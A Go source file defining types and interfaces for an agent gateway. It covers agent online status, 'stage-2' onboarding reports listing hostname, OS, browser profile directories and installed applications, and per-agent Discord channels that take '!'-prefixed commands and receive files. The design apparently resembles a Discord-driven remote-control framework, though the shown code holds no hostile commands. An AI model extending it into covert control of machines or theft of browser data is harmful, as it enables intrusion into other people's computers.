package provider

import (
	"context"
	"errors"
	"fmt"
	"time"
)

// Status represents the lifecycle state of an authenticated agent.
type Status string

const (
	StatusOnline  Status = "online"
	StatusOffline Status = "offline"
)

// ActivityEvent is server-authored activity metadata derived at the gateway boundary.
type ActivityEvent struct {
	AgentID    string
	Hostname   string
	OccurredAt time.Time
	Status     Status
	Source     string
}

// BrowserInfo contains non-sensitive browser installation metadata.
type BrowserInfo struct {
	Name       string
	BinaryPath string
	ProfileDir string
}

// EntryReport contains authenticated stage-2 onboarding metadata.
//
// All identity fields in this shape are server-authored or gateway-validated.
type EntryReport struct {
	AgentID               string
	Hostname              string
	OSVersion             string
	IsNewAgent            bool
	Browsers              []BrowserInfo
	InstalledApplications []string
	OccurredAt            time.Time
	Source                string
}

// AgentSnapshot is a point-in-time view of agent presence at the gateway boundary.
type AgentSnapshot struct {
	AgentID  string
	Hostname string
	LastSeen time.Time
	IsOnline bool
}

// DiscordPoster is implemented by the Discord provider for sending messages
// and files back to Discord channels from command handlers.
type DiscordPoster interface {
	SendChannelMessage(ctx context.Context, channelID, content string) error
	SendChannelFile(ctx context.Context, channelID, fileName string, data []byte, content string) error
	CommandsChannelID(agentID string) (string, bool)
}

// DiscordCommandHandler processes parsed !-prefixed commands from Discord.
type DiscordCommandHandler interface {
	HandleDiscordCommand(ctx context.Context, agentID, channelID, command string, args []string, userName string) error
}

// Provider receives normalized agent activity events.
type Provider interface {
	Name() string
	Notify(ctx context.Context, event ActivityEvent) error
}

// EntryReporter is implemented by providers that can handle stage-2 reports.
type EntryReporter interface {
	ReportEntry(ctx context.Context, report EntryReport) error
}

// PreflightChecker validates provider readiness (for example auth and access) at startup.
type PreflightChecker interface {
	PreflightCheck(ctx context.Context) error
}

// Fanout dispatches each activity event to all configured providers.
type Fanout struct {
	providers []Provider
}

func NewFanout(providers []Provider) *Fanout {
	copyProviders := make([]Provider, 0, len(providers))
	for _, p := range providers {
		if p != nil {
			copyProviders = append(copyProviders, p)
		}
	}
	return &Fanout{providers: copyProviders}
}

func (f *Fanout) Notify(ctx context.Context, event ActivityEvent) error {
	if f == nil || len(f.providers) == 0 {
		return nil
	}

	var errs []error
	for _, p := range f.providers {
		if err := p.Notify(ctx, event); err != nil {
			errs = append(errs, fmt.Errorf("provider %q: %w", p.Name(), err))
		}
	}

	return errors.Join(errs...)
}

// ReportEntry dispatches stage-2 onboarding reports to capable providers.
func (f *Fanout) ReportEntry(ctx context.Context, report EntryReport) error {
	if f == nil || len(f.providers) == 0 {
		return nil
	}

	var errs []error
	for _, p := range f.providers {
		reporter, ok := p.(EntryReporter)
		if !ok {
			continue
		}

		if err := reporter.ReportEntry(ctx, report); err != nil {
			errs = append(errs, fmt.Errorf("provider %q: %w", p.Name(), err))
		}
	}

	return errors.Join(errs...)
}
